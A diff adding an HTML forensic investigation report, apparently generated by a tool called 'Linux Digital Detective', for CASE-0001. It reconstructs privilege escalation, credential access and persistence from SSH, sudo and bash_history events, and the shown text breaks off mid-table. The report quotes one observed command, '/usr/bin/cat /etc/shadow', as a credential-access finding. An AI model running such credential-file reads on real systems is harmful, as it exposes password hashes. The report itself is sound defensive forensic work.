@@ -1,0 +1,3359 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<meta
+    name="generator"
+    content="Linux Digital Detective"
+>
+
+<title>
+    Linux Digital Detective — Investigation Report
+</title>
+
+<style>
+
+:root {
+    --background: #0b0f14;
+    --surface: #111820;
+    --surface-alt: #17212b;
+    --border: #293542;
+    --text: #e7edf3;
+    --muted: #91a0af;
+    --critical: #ff5c5c;
+    --high: #ff9f43;
+    --medium: #f2c94c;
+    --low: #5aa9ff;
+    --info: #aab7c4;
+    --accent: #62d8ff;
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background:
+        radial-gradient(
+            circle at top right,
+            #172531 0,
+            var(--background) 42%
+        );
+    color: var(--text);
+    font-family:
+        Inter,
+        ui-sans-serif,
+        system-ui,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        sans-serif;
+    line-height: 1.55;
+}
+
+.container {
+    width: min(
+        1400px,
+        calc(100% - 48px)
+    );
+    margin: 0 auto;
+    padding: 42px 0 80px;
+}
+
+header {
+    padding: 10px 0 30px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 28px;
+}
+
+.brand {
+    display: flex;
+    justify-content: space-between;
+    gap: 30px;
+    align-items: flex-start;
+}
+
+.eyebrow {
+    color: var(--accent);
+    font-size: 12px;
+    font-weight: 800;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+}
+
+h1 {
+    margin: 6px 0 4px;
+    font-size: clamp(
+        30px,
+        5vw,
+        52px
+    );
+    line-height: 1.05;
+}
+
+h2 {
+    margin-top: 0;
+    font-size: 23px;
+}
+
+h3 {
+    margin: 4px 0;
+}
+
+.subtitle {
+    color: var(--muted);
+    margin: 0;
+}
+
+.report-label {
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    padding: 8px 13px;
+    color: var(--muted);
+    white-space: nowrap;
+    font-size: 12px;
+    font-weight: 700;
+}
+
+.case-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 24px;
+    margin-bottom: 24px;
+}
+
+.case-title {
+    font-size: 25px;
+    font-weight: 800;
+}
+
+.case-description {
+    color: var(--muted);
+    max-width: 850px;
+}
+
+.metrics {
+    display: grid;
+    grid-template-columns:
+        repeat(
+            auto-fit,
+            minmax(180px, 1fr)
+        );
+    gap: 14px;
+    margin-bottom: 24px;
+}
+
+.metric {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 19px;
+}
+
+.metric-label {
+    color: var(--muted);
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    font-weight: 700;
+}
+
+.metric-value {
+    margin-top: 7px;
+    font-size: 30px;
+    font-weight: 850;
+}
+
+.metric-value.critical {
+    color: var(--critical);
+}
+
+.metric-value.high {
+    color: var(--high);
+}
+
+.metric-value.medium {
+    color: var(--medium);
+}
+
+.metric-value.low {
+    color: var(--low);
+}
+
+.metric-value.info {
+    color: var(--info);
+}
+
+.section {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 25px;
+    margin-bottom: 24px;
+}
+
+.section-header {
+    display: flex;
+    justify-content: space-between;
+    gap: 20px;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.section-header p {
+    color: var(--muted);
+    margin: 4px 0 0;
+}
+
+.attack-path {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 10px;
+    padding: 20px;
+    border-radius: 13px;
+    background: var(--surface-alt);
+    border: 1px solid var(--border);
+}
+
+.attack-stage {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border: 1px solid var(--border);
+    background: #0e151d;
+    border-radius: 10px;
+    padding: 10px 13px;
+    font-weight: 750;
+}
+
+.stage-number {
+    width: 24px;
+    height: 24px;
+    display: grid;
+    place-items: center;
+    border-radius: 50%;
+    background: var(--accent);
+    color: #081016;
+    font-size: 12px;
+    font-weight: 900;
+}
+
+.attack-arrow {
+    color: var(--accent);
+    font-size: 22px;
+    font-weight: 800;
+}
+
+.story-item {
+    display: grid;
+    grid-template-columns: 32px 1fr;
+    gap: 13px;
+    align-items: start;
+    margin: 15px 0;
+}
+
+.story-number {
+    width: 30px;
+    height: 30px;
+    display: grid;
+    place-items: center;
+    border: 1px solid var(--border);
+    border-radius: 50%;
+    color: var(--accent);
+    font-weight: 800;
+}
+
+.story-item p {
+    margin: 3px 0 0;
+}
+
+.conclusion {
+    margin-top: 22px;
+    padding: 18px;
+    border-left: 4px solid var(--critical);
+    background: var(--surface-alt);
+    border-radius: 9px;
+}
+
+.context-grid {
+    display: grid;
+    grid-template-columns:
+        repeat(
+            auto-fit,
+            minmax(200px, 1fr)
+        );
+    gap: 12px;
+}
+
+.context-item {
+    padding: 16px;
+    background: var(--surface-alt);
+    border: 1px solid var(--border);
+    border-radius: 11px;
+}
+
+.context-label {
+    display: block;
+    color: var(--muted);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 5px;
+}
+
+table {
+    width: 100%;
+    border-collapse: collapse;
+}
+
+th {
+    color: var(--muted);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.07em;
+    background: var(--surface-alt);
+}
+
+th,
+td {
+    padding: 13px 12px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+    vertical-align: top;
+}
+
+tr:last-child td {
+    border-bottom: 0;
+}
+
+.mono {
+    font-family:
+        "JetBrains Mono",
+        "Cascadia Code",
+        Consolas,
+        monospace;
+    font-size: 12px;
+}
+
+.subtext {
+    color: var(--muted);
+    font-size: 12px;
+    margin-top: 2px;
+}
+
+.severity {
+    font-weight: 850;
+    font-size: 12px;
+    letter-spacing: 0.04em;
+}
+
+.critical {
+    color: var(--critical);
+}
+
+.high {
+    color: var(--high);
+}
+
+.medium {
+    color: var(--medium);
+}
+
+.low {
+    color: var(--low);
+}
+
+.info {
+    color: var(--info);
+}
+
+.finding-detail td {
+    color: var(--muted);
+    font-size: 13px;
+    background: #0d141b;
+}
+
+.sequence {
+    color: var(--accent);
+    font-weight: 800;
+}
+
+.timestamp {
+    white-space: nowrap;
+}
+
+.gap {
+    color: var(--muted);
+    white-space: nowrap;
+}
+
+.chain-card {
+    background: var(--surface-alt);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 20px;
+    margin-bottom: 16px;
+}
+
+.chain-card:last-child {
+    margin-bottom: 0;
+}
+
+.chain-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    gap: 20px;
+}
+
+.chain-metrics {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-wrap: wrap;
+}
+
+.confidence {
+    color: var(--muted);
+    font-size: 12px;
+    font-weight: 700;
+}
+
+.chain-summary {
+    color: var(--muted);
+}
+
+.chain-steps {
+    border-left: 2px solid var(--border);
+    margin: 20px 0 0 12px;
+}
+
+.chain-step {
+    position: relative;
+    display: grid;
+    grid-template-columns: 34px 1fr;
+    gap: 13px;
+    margin: 0 0 18px -18px;
+}
+
+.step-marker {
+    width: 32px;
+    height: 32px;
+    display: grid;
+    place-items: center;
+    background: var(--surface);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    border-radius: 50%;
+    font-weight: 800;
+}
+
+.step-content {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 13px 15px;
+}
+
+.step-content p {
+    color: var(--muted);
+    margin: 8px 0 0;
+}
+
+.step-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+}
+
+.stage-badge {
+    color: var(--accent);
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    padding: 4px 8px;
+    font-size: 10px;
+    font-weight: 800;
+}
+
+.technique-id {
+    display: inline-block;
+    padding: 5px 8px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: var(--surface-alt);
+    font-family:
+        "JetBrains Mono",
+        Consolas,
+        monospace;
+    font-weight: 800;
+}
+
+.empty-state,
+.empty-cell {
+    color: var(--muted);
+    text-align: center;
+    padding: 25px;
+}
+
+.footer {
+    color: var(--muted);
+    text-align: center;
+    padding: 25px 0 0;
+    font-size: 12px;
+}
+
+@media (max-width: 800px) {
+
+    .container {
+        width: min(
+            100% - 24px,
+            1400px
+        );
+        padding-top: 20px;
+    }
+
+    .brand,
+    .section-header,
+    .chain-header {
+        flex-direction: column;
+        align-items: flex-start;
+    }
+
+    table {
+        display: block;
+        overflow-x: auto;
+    }
+
+    .attack-path {
+        align-items: flex-start;
+    }
+
+}
+
+@media print {
+
+    body {
+        background: white;
+        color: black;
+    }
+
+    .container {
+        width: 100%;
+        padding: 0;
+    }
+
+    .section,
+    .case-card,
+    .metric {
+        break-inside: avoid;
+        border-color: #ccc;
+        background: white;
+    }
+
+    .subtext,
+    .subtitle,
+    .chain-summary,
+    .story-item p,
+    .context-label {
+        color: #444;
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<header>
+
+    <div class="brand">
+
+        <div>
+
+            <div class="eyebrow">
+                Linux Digital Detective
+            </div>
+
+            <h1>
+                Investigation Report
+            </h1>
+
+            <p class="subtitle">
+                Digital forensic investigation and attack reconstruction
+            </p>
+
+        </div>
+
+        <div class="report-label">
+            OFFLINE FORENSIC REPORT
+        </div>
+
+    </div>
+
+</header>
+
+<div class="case-card">
+
+    <div class="eyebrow">
+        Investigation Case
+    </div>
+
+    <div class="case-title">
+        CASE-0001
+    </div>
+
+    <p class="case-description">
+        Evidence-derived investigation generated by
+        Linux Digital Detective.
+    </p>
+
+    
+    <div class="context-grid">
+
+        <div class="context-item">
+
+            <span class="context-label">
+                Observed User(s)
+            </span>
+
+            <strong>
+                analyst, root
+            </strong>
+
+        </div>
+
+        <div class="context-item">
+
+            <span class="context-label">
+                Source Address(es)
+            </span>
+
+            <strong class="mono">
+                Not identified
+            </strong>
+
+        </div>
+
+        <div class="context-item">
+
+            <span class="context-label">
+                Findings
+            </span>
+
+            <strong>
+                11
+            </strong>
+
+        </div>
+
+        <div class="context-item">
+
+            <span class="context-label">
+                Attack Chains
+            </span>
+
+            <strong>
+                3
+            </strong>
+
+        </div>
+
+    </div>
+    
+
+</div>
+
+<div class="metrics">
+
+    <div class="metric">
+
+        <div class="metric-label">
+            Risk Score
+        </div>
+
+        <div class="metric-value critical">
+            100/100
+        </div>
+
+    </div>
+
+    <div class="metric">
+
+        <div class="metric-label">
+            Risk Level
+        </div>
+
+        <div class="metric-value critical">
+            CRITICAL
+        </div>
+
+    </div>
+
+    <div class="metric">
+
+        <div class="metric-label">
+            Confidence
+        </div>
+
+        <div class="metric-value">
+            100%
+        </div>
+
+    </div>
+
+    <div class="metric">
+
+        <div class="metric-label">
+            Normalized Events
+        </div>
+
+        <div class="metric-value">
+            23
+        </div>
+
+    </div>
+
+    <div class="metric">
+
+        <div class="metric-label">
+            Findings
+        </div>
+
+        <div class="metric-value">
+            11
+        </div>
+
+    </div>
+
+    <div class="metric">
+
+        <div class="metric-label">
+            MITRE Techniques
+        </div>
+
+        <div class="metric-value">
+            6
+        </div>
+
+    </div>
+
+</div>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                Attack Reconstruction
+            </h2>
+
+            <p>
+                High-level sequence reconstructed from correlated detections.
+            </p>
+
+        </div>
+
+    </div>
+
+    <div class="attack-path">
+            <div class="attack-stage">
+                <span class="stage-number">
+                    1
+                </span>
+                <span class="stage-name">
+                    Privilege Escalation
+                </span>
+            </div>
+            <div class="attack-arrow">→</div>
+            <div class="attack-stage">
+                <span class="stage-number">
+                    2
+                </span>
+                <span class="stage-name">
+                    Credential Access
+                </span>
+            </div>
+            <div class="attack-arrow">→</div>
+            <div class="attack-stage">
+                <span class="stage-number">
+                    3
+                </span>
+                <span class="stage-name">
+                    Persistence
+                </span>
+            </div>
+            </div>
+
+</section>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                Investigator Assessment
+            </h2>
+
+            <p>
+                Human-readable interpretation of the available evidence.
+            </p>
+
+        </div>
+
+    </div>
+
+    
+        <div class="story-item">
+            <span class="story-number">
+                1
+            </span>
+            <p>A privilege transition was detected through sudo execution. This indicates that the authenticated account obtained higher local privileges and requires investigation. Observed command(s): /bin/bash; /usr/bin/id; /usr/bin/cat /etc/shadow.</p>
+        </div>
+        
+        <div class="story-item">
+            <span class="story-number">
+                2
+            </span>
+            <p>Credential-access behavior was observed, indicating possible attempts to obtain or inspect authentication material.</p>
+        </div>
+        
+        <div class="story-item">
+            <span class="story-number">
+                3
+            </span>
+            <p>Network reconnaissance activity was detected, indicating possible enumeration of services, network configuration, or active connections.</p>
+        </div>
+        
+        <div class="story-item">
+            <span class="story-number">
+                4
+            </span>
+            <p>Persistence-related activity was detected, suggesting a possible attempt to maintain access beyond the initial session.</p>
+        </div>
+        
+        <div class="story-item">
+            <span class="story-number">
+                5
+            </span>
+            <p>Remote content transfer or command-and-control behavior was observed.</p>
+        </div>
+        
+
+    <div class="conclusion">
+
+        <strong>
+            Assessment
+        </strong>
+
+        <p>
+            The available evidence contains a privilege transition that requires investigation. Observed user=analyst, root. Overall assessed risk is CRITICAL (100/100).
+        </p>
+
+    </div>
+
+</section>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                Evidence Timeline
+            </h2>
+
+            <p>
+                Chronologically normalized forensic events.
+            </p>
+
+        </div>
+
+    </div>
+
+    <table>
+
+        <thead>
+
+            <tr>
+                <th>#</th>
+                <th>Timestamp</th>
+                <th>Event</th>
+                <th>User</th>
+                <th>Source</th>
+                <th>Severity</th>
+                <th>Gap</th>
+            </tr>
+
+        </thead>
+
+        <tbody>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:30:01
+                </td>
+
+                <td>
+                    <strong>
+                        SSH_AUTH_FAILURE
+                    </strong>
+
+                    <div class="subtext">
+                        ssh
+                    </div>
+                </td>
+
+                <td>
+                    test
+                </td>
+
+                <td class="mono">
+                    203.0.113.88
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:30:03
+                </td>
+
+                <td>
+                    <strong>
+                        SSH_AUTH_FAILURE
+                    </strong>
+
+                    <div class="subtext">
+                        ssh
+                    </div>
+                </td>
+
+                <td>
+                    admin
+                </td>
+
+                <td class="mono">
+                    203.0.113.88
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:30:05
+                </td>
+
+                <td>
+                    <strong>
+                        SSH_AUTH_FAILURE
+                    </strong>
+
+                    <div class="subtext">
+                        auth.log
+                    </div>
+                </td>
+
+                <td>
+                    root
+                </td>
+
+                <td class="mono">
+                    203.0.113.88
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:30:05
+                </td>
+
+                <td>
+                    <strong>
+                        SSH_AUTH_FAILURE
+                    </strong>
+
+                    <div class="subtext">
+                        ssh
+                    </div>
+                </td>
+
+                <td>
+                    root
+                </td>
+
+                <td class="mono">
+                    203.0.113.88
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:30:12
+                </td>
+
+                <td>
+                    <strong>
+                        SSH_AUTH_SUCCESS
+                    </strong>
+
+                    <div class="subtext">
+                        auth.log
+                    </div>
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    203.0.113.88
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:30:12
+                </td>
+
+                <td>
+                    <strong>
+                        SSH_AUTH_SUCCESS
+                    </strong>
+
+                    <div class="subtext">
+                        ssh
+                    </div>
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    203.0.113.88
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:32:10
+                </td>
+
+                <td>
+                    <strong>
+                        SUDO_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        sudo
+                    </div>
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity critical">
+                        CRITICAL
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:32:15
+                </td>
+
+                <td>
+                    <strong>
+                        SUDO_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        sudo
+                    </div>
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity critical">
+                        CRITICAL
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:32:21
+                </td>
+
+                <td>
+                    <strong>
+                        SUDO_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        sudo
+                    </div>
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity critical">
+                        CRITICAL
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:33:01
+                </td>
+
+                <td>
+                    <strong>
+                        SYSLOG_EVENT
+                    </strong>
+
+                    <div class="subtext">
+                        syslog
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:34:01
+                </td>
+
+                <td>
+                    <strong>
+                        SYSLOG_EVENT
+                    </strong>
+
+                    <div class="subtext">
+                        syslog
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 15:35:01
+                </td>
+
+                <td>
+                    <strong>
+                        SYSLOG_EVENT
+                    </strong>
+
+                    <div class="subtext">
+                        syslog
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.631866
+                </td>
+
+                <td>
+                    <strong>
+                        BASH_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.631929
+                </td>
+
+                <td>
+                    <strong>
+                        BASH_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.631957
+                </td>
+
+                <td>
+                    <strong>
+                        BASH_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.631982
+                </td>
+
+                <td>
+                    <strong>
+                        BASH_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632003
+                </td>
+
+                <td>
+                    <strong>
+                        NETWORK_RECON
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632017
+                </td>
+
+                <td>
+                    <strong>
+                        SUDO_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity high">
+                        HIGH
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632028
+                </td>
+
+                <td>
+                    <strong>
+                        CREDENTIAL_ACCESS
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity high">
+                        HIGH
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632102
+                </td>
+
+                <td>
+                    <strong>
+                        PERSISTENCE
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity high">
+                        HIGH
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632449
+                </td>
+
+                <td>
+                    <strong>
+                        DOWNLOAD
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632515
+                </td>
+
+                <td>
+                    <strong>
+                        BASH_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="sequence">
+                    -
+                </td>
+
+                <td class="mono timestamp">
+                    2026-10-06 20:08:57.632546
+                </td>
+
+                <td>
+                    <strong>
+                        BASH_COMMAND
+                    </strong>
+
+                    <div class="subtext">
+                        bash_history
+                    </div>
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td>
+                    <span class="severity info">
+                        INFO
+                    </span>
+                </td>
+
+                <td class="gap">
+                    0s
+                </td>
+            </tr>
+            
+        </tbody>
+
+    </table>
+
+</section>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                Detection Findings
+            </h2>
+
+            <p>
+                Security detections generated by the investigation engines.
+            </p>
+
+        </div>
+
+    </div>
+
+    <table>
+
+        <thead>
+
+            <tr>
+                <th>ID</th>
+                <th>Finding</th>
+                <th>Severity</th>
+                <th>Category</th>
+                <th>User</th>
+                <th>Source</th>
+                <th>Timestamp</th>
+            </tr>
+
+        </thead>
+
+        <tbody>
+            
+            <tr>
+                <td class="mono">
+                    PRIV-ESC-0001
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Privilege Escalation Detected
+                    </strong>
+
+                    <div class="subtext">
+                        PRIVILEGE_ESCALATION
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity critical">
+                        CRITICAL
+                    </span>
+                </td>
+
+                <td>
+                    -
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 15:32:10
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    User analyst executed a command through sudo as root. This represents a privilege transition that requires investigation.
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    PRIV-ESC-0002
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Privilege Escalation Detected
+                    </strong>
+
+                    <div class="subtext">
+                        PRIVILEGE_ESCALATION
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity critical">
+                        CRITICAL
+                    </span>
+                </td>
+
+                <td>
+                    -
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 15:32:15
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    User analyst executed a command through sudo as root. This represents a privilege transition that requires investigation.
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    PRIV-ESC-0003
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Privilege Escalation Detected
+                    </strong>
+
+                    <div class="subtext">
+                        PRIVILEGE_ESCALATION
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity critical">
+                        CRITICAL
+                    </span>
+                </td>
+
+                <td>
+                    -
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 15:32:21
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    User analyst executed a command through sudo as root. This represents a privilege transition that requires investigation.
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    SUSPICIOUS-CMD-0001
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Credential or SSH Key Access
+                    </strong>
+
+                    <div class="subtext">
+                        SUSPICIOUS_COMMAND
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity high">
+                        HIGH
+                    </span>
+                </td>
+
+                <td>
+                    CREDENTIAL_ACCESS
+                </td>
+
+                <td>
+                    analyst
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 15:32:21
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command references credential stores or SSH authentication material. Observed command: /usr/bin/cat /etc/shadow
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    SUSPICIOUS-CMD-0002
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Network Reconnaissance Command
+                    </strong>
+
+                    <div class="subtext">
+                        SUSPICIOUS_COMMAND
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td>
+                    NETWORK_RECON
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.632003
+                </td>
